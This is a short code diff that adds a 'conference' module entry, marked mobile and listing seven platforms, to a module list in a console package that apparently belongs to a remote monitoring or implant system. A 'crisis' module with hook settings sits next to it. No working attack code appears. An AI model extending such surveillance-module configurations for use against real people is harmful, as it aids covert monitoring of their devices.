@@ -69,6 +69,12 @@ package it.ht.rcs.console
         },
         
         {
+          module: "conference",
+          _type: "mobile",
+          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
+        },
+        
+        {
           module: "crisis",
           network: {enabled: false, processes: []},
           hook: {enabled: true, processes: []},
